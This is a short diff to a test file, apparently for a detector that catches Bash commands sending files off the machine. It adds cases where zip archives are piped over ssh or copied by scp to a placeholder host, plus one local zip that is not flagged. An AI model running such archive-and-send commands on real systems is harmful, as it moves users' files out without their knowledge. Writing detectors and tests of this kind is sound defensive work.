@@ -195,6 +195,9 @@ test('Bash: package registries, images, cloud storage, glab, ftp, shares and /de
   // An archive a sending line makes: its sources are what goes out
   expect(held('tar czf - notes | ssh far.invalid "cat > n.tgz"')[0]?.files).toEqual(['notes'])
   expect(held('tar -C docs -czf out.tgz . && scp out.tgz far.invalid:')[0]?.files).toEqual(['out.tgz', 'docs'])
+  expect(held('zip -qr - notes | ssh far.invalid "cat > n.zip"')[0]?.files).toEqual(['notes'])
+  expect(held("zip out.zip -r notes docs -x '*.tmp' && scp out.zip far.invalid:")[0]?.files).toEqual(['out.zip', 'notes', 'docs'])
+  expect(held('zip -r out.zip notes')).toEqual([])
 })
 
 test('Bash: an endpoint, registry or proxy the environment names is where it goes too; a variable with no such meaning is harmless', () => {
